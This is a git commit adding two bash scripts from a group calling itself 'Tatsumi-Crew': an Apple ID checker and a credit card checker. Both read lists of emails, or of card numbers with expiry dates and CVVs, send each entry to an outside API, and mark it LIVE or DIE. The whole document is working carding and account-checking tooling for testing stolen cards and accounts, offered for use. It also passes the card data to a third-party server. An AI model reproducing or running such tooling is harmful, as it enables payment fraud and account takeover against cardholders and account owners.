f290ebb7218f1d497bc59ea974d6676ef2eba7b6
Arvan Apriyana <40161320+nako48@users.noreply.github.com>
2018-08-11 14:56:25 +0700

    Add files via upload

---
+++ Apple-Checker/nako.sh
@@ -0,0 +1,68 @@
+#!/bin/bash
+#Tatsumi-Crew & Arvan Apriyana
+clear
+header(){
+waktu=$(date '+%Y-%m-%d %H:%M:%S')
+HIJAU='\033[0;32m'
+MERAH='\033[0;31m'
+NORMAL='\033[0m'
+CYAN='\033[0;36m'
+BIRU='\033[0;34m'
+PUTIH='\033[1;37m'
+printf "
+${PUTIH}
+___________________________________________________________
+
+ ████████╗ █████╗ ████████╗███████╗██╗   ██╗███╗   ███╗██╗
+ ╚══██╔══╝██╔══██╗╚══██╔══╝██╔════╝██║   ██║████╗ ████║██║
+    ██║   ███████║   ██║   ███████╗██║   ██║██╔████╔██║██║
+    ██║   ██╔══██║   ██║   ╚════██║██║   ██║██║╚██╔╝██║██║
+    ██║   ██║  ██║   ██║   ███████║╚██████╔╝██║ ╚═╝ ██║██║
+    ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝
+  
+                  Apple ID Checker V.1 
+                  www.tatsumi-crew.net 
+          Bug? contact Me : nako48@cyber00t.biz 
+           Facebook : https://fb.com/nako48.jp 
+___________________________________________________________
+"
+}
+tatsumi(){
+    ua=$(cat ua.txt | sort -R | head -1)
+    duration=$SECONDS
+    SECONDS=0
+    curlnya=$(curl -s "http://api.nakocoders.org/apple/index.php?emailna=$1" -L)
+    livena=$(echo $curlnya | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
+    if [[ ! $livena =~ "DIE" ]]; then
+        printf "${HIJAU}[LIVE] $1 [$waktu]\n";
+        printf "${NORMAL}"
+    else
+        printf "${RED}[DIE] $1 [$waktu]\n";
+        printf "${NORMAL}"
+    fi
+}
+header
+echo ""
+echo "==========================================================="
+echo "List In This Directory : "
+ls
+echo "==========================================================="
+echo "Delimeter list -> email "
+echo -n "Put Your List : "
+read list
+if [ ! -f $list ]; then
+    echo "$list No Such File"
+exit
+fi
+if [[ $perSec == '' ]]; then
+    read -p "Delay time: " perSecs
+    duration=$SECONDS
+    echo "[$header] ========= $perSec Please. $(($duration / 3600)) Wait $(($duration / 60)) ========= $(($duration % 60)) "
+    sleep $perSec
+fi
+    x=$(gawk '{ print $1 }' $list)
+    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailna=($x)'
+for (( i = 0; i < "${#emailna[@]}"; i++ )); do
+        scanskrngah="${emailna[$i]}"
+        tatsumi $scanskrngah
+done
---
+++ CC-Checker/nako.sh
@@ -0,0 +1,69 @@
+#!/bin/bash
+#Tatsumi-Crew & Arvan Apriyana
+clear
+header(){
+waktu=$(date '+%Y-%m-%d %H:%M:%S')
+HIJAU='\033[0;32m'
+MERAH='\033[0;31m'
+NORMAL='\033[0m'
+CYAN='\033[0;36m'
+BIRU='\033[0;34m'
+PUTIH='\033[1;37m'
+printf "
+${PUTIH}
+___________________________________________________________
+
+ ████████╗ █████╗ ████████╗███████╗██╗   ██╗███╗   ███╗██╗
+ ╚══██╔══╝██╔══██╗╚══██╔══╝██╔════╝██║   ██║████╗ ████║██║
+    ██║   ███████║   ██║   ███████╗██║   ██║██╔████╔██║██║
+    ██║   ██╔══██║   ██║   ╚════██║██║   ██║██║╚██╔╝██║██║
+    ██║   ██║  ██║   ██║   ███████║╚██████╔╝██║ ╚═╝ ██║██║
+    ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝
+  
+                  CC Checker V.2 Trial 
+                  www.tatsumi-crew.net 
+          Bug? contact Me : nako48@cyber00t.biz 
+           Facebook : https://fb.com/nako48.jp 
+___________________________________________________________
+"
+}
+tatsumi(){
+    ua=$(cat ua.txt | sort -R | head -1)
+    duration=$SECONDS
+    SECONDS=0
+    curlnya=$(curl -s "http://api.nakocoders.org/index.php?num=$1&bulan=$2&tahun=$3&ccvna=$4" -L)
+    livena=$(echo $curlnya | grep -Po '(?<="code":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
+    if [[ ! $livena =~ "card_declined" ]]; then
+        printf "${HIJAU}[LIVE] $1 [$waktu]\n";
+        printf "${NORMAL}"
+    else
+        printf "${RED}[DIE] $1 [$waktu]\n";
+        printf "${NORMAL}"
+    fi
+}
+header
+echo ""
+echo "List In This Directory : "
+ls
+echo "Delimeter list -> ccnum:bulan:tahun:ccv "
+echo -n "Masukan File List : "
+read list
+if [ ! -f $list ]; then
+    echo "$list No Such File"
+exit
+fi
+    x=$(gawk -F: '{ print $1 }' $list)
+    y=$(gawk -F: '{ print $2 }' $list)
+    z=$(gawk -F: '{ print $3 }' $list)
+    h=$(gawk -F: '{ print $4 }' $list)
+    IFS=$'\r\n' GLOBIGNORE='*' command eval  'ccnum=($x)'
+    IFS=$'\r\n' GLOBIGNORE='*' command eval  'exp1=($y)'
+    IFS=$'\r\n' GLOBIGNORE='*' command eval  'exp2=($z)'
+    IFS=$'\r\n' GLOBIGNORE='*' command eval  'ccv=($h)'
+for (( i = 0; i < "${#ccnum[@]}"; i++ )); do
+    ccnumberna="${ccnum[$i]}"
+    bulanna="${exp1[$i]}"
+    tahunna="${exp2[$i]}"
+    ccvna="${ccv[$i]}"
+        tatsumi $ccnumberna $bulanna $tahunna $ccvna
+done
